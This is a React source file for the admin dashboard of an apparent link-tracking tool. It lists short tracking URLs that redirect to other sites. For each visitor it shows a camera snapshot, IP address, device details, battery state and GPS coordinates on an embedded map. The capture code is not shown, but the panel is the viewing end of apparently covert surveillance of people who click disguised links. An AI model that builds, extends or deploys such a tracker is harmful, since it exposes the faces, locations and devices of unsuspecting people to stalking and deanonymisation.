import React, { useEffect, useState } from "react";
import { useParams } from "react-router-dom";

export default function AdminPanel() {
  const { shortId } = useParams();

  const [stats, setStats] = useState([]);
  const [selectedShortId, setSelectedShortId] = useState(null);
  const [selectedVisitor, setSelectedVisitor] = useState(null);
  const [expandedImage, setExpandedImage] = useState(null);


  useEffect(() => {
    const fetchData = () => {
      const token = localStorage.getItem("token");

      fetch(`https://user-tracking-1.onrender.com/api/auth/analytics/${shortId}`, {
        headers: {
          Authorization: `Bearer ${token}`,
        },
      })
        .then((res) => res.json())
        .then((data) => {
          if (data.logs) {
            setStats(data.logs);
          }
        })
        .catch((err) => console.error("Error fetching data:", err));
    };

    fetchData();
  }, [shortId]);

  const activeEntry = stats.find(
    (item) => item.shortId === selectedShortId
  );

  const visitorLogs = activeEntry ? activeEntry.analytics : [];

  return (
    <div className="admin-container">
      <h1>Admin Dashboard</h1>

      <div className="table-container">
        <h3>Tracking URLs Overview</h3>
        <table
          border="1"
          width="100%"
          style={{ borderCollapse: "collapse", textAlign: "left" }}
        >
          <thead>
            <tr>
              <th>Tracking URL</th>
              <th>Destination URL</th>
              <th>Visitors Count</th>
              <th>Action</th>
            </tr>
          </thead>
          <tbody>
            {stats.length > 0 ? (
              stats.map((item, index) => (
                <tr key={index}>
                  <td>{`https://user-tracking-six.vercel.app/t/${item.shortId}`}</td>
                  <td>{item.destinationUrl}</td>
                  <td>{item.clicks}</td>
                  <td>
                    <button
                      onClick={() => {
                        setSelectedShortId(item.shortId);
                        setSelectedVisitor(null); // reset modal
                      }}
                    >
                      {selectedShortId === item.shortId
                        ? "Viewing..."
                        : "View Details"}
                    </button>
                  </td>
                </tr>
              ))
            ) : (
              <tr>
                <td colSpan="4" style={{ textAlign: "center", padding: "10px" }}>
                  no tracking url found
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>

      {selectedShortId && (
        <div className="user-details">
          <div
            style={{
              display: "flex",
              justifyContent: "right",
              alignItems: "center",
            }}
          >
            <button onClick={() => setSelectedShortId(null)}>✕</button>
          </div>
      <div className="log row py-5">
          {visitorLogs.length > 0 ? (
            visitorLogs.map((log, index) => (
              <div
                key={index}
                className="device-box  col-md-8 "
               
              >
                <div>
                  <h4>Camera Capture</h4>
                  {log.cameraImage ? (
                    <img
                      src={log.cameraImage}
                      alt="User"
                      width="150"
                     onClick={() => setExpandedImage(log.cameraImage)} 

                      style={{ borderRadius: "8px" }}
                    />
                  ) : (
                    <p>No Image Captured</p>
                  )}

                  <p>
                    <b>IP:</b> {log.ip}
                  </p>

                  <button onClick={() => setSelectedVisitor(log)}>
                    View Details
                  </button>
                </div>
              </div>
            ))
          ) : (
            <p>No visitor logs found for this specific tracking URL.</p>
          )}
</div>
          {/* Modal */}
          {selectedVisitor && (
            <div className="modal-overlay">
              <div
                className="modal-content"
                
              >
                <div
                  style={{
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                  }}
                >
                  <h3>Visitor Details</h3>
                  <button
                    onClick={() => setSelectedVisitor(null)}
                    className="close-btn"
                  >
                    ✕  
                  </button>
                </div>

                <hr />

                <div style={{ textAlign: "left", marginTop: "15px" }}>
                  <h4>Device Info</h4>
                  <p>
                    <b>IP:</b> {selectedVisitor.ip}
                  </p>
                  <p>
                    <b>Browser:</b> {selectedVisitor.browser}
                  </p>
                  <p>
                    <b>Platform:</b> {selectedVisitor.platform}
                  </p>
                  <p>
                    <b>Screen:</b> {selectedVisitor.screen}
                  </p>
                  <p>
                    <b>RAM:</b> {selectedVisitor.ram} GB
                  </p>
                  <p>
                    <b>CPU:</b> {selectedVisitor.cpuCores} Cores
                  </p>
                  <p>
                    <b>Battery:</b> {selectedVisitor.batteryLevel}% (
                    {selectedVisitor.isCharging
                      ? "Charging"
                      : "Unplugged"}
                    )
                  </p>
                  <p>
                    <b>Captured At:</b>{" "}
                    {new Date(
                      selectedVisitor.timestamp
                    ).toLocaleString()}
                  </p>
                </div>

                <h4 style={{ textAlign: "left", marginTop: "20px" }}>
                  Location Map
                </h4>

                {selectedVisitor.latitude &&
                selectedVisitor.longitude ? (
                  <iframe
                    title="location"
                    width="100%"
                    height="300"
                    style={{ border: 0, borderRadius: "8px" }}
                    src={`https://maps.google.com/maps?q=${selectedVisitor.latitude},${selectedVisitor.longitude}&z=15&output=embed`}
                  ></iframe>
                ) : (
                  <p>
                    Location data not available for this visitor.
                  </p>
                )}
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}